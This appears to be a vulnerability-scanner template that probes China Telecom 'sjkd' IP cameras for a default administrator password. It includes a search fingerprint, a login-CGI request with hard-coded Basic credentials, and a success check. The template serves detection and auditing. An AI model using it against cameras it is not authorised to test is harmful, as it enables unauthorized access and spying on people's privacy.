name: ChinaTelecom_sjkd_camera_default_password
transport: http
detail:
  dock: body="guide/login.html"
  product: ChinaTelecom-sjkd
  homepage: https://www.sjkd189.cn/
  impact: ''
  description: According to the account password, the attacker can log in to the camera
    background, control the camera, peep into the privacy of others, and control the
    camera to move and take the picture that he wants to take.
set:
  reqUrl: request.url
rules:
  r1:
    method: GET
    path: /cgi-bin/login.cgi?action=list&group=LOGIN&UserID=37887967
    follow_redirects: true
    headers:
      Content-Type: text/html; charset=UTF-8
      Authorization: Basic YWRtaW46MTk4NDA0MDM=
      Referer: '{{reqUrl}}/login.asp'
      Cookie: nLANGUAGE=0; nDevType=2; nChnCount=1; nRtspPort=554; nRtmpPort=1935;
        nMsgPort=8091; nUserLevel=4
    expression: response.status == 200 && response.body.bcontains(b'root.ERR.no=0')
expression: r1()
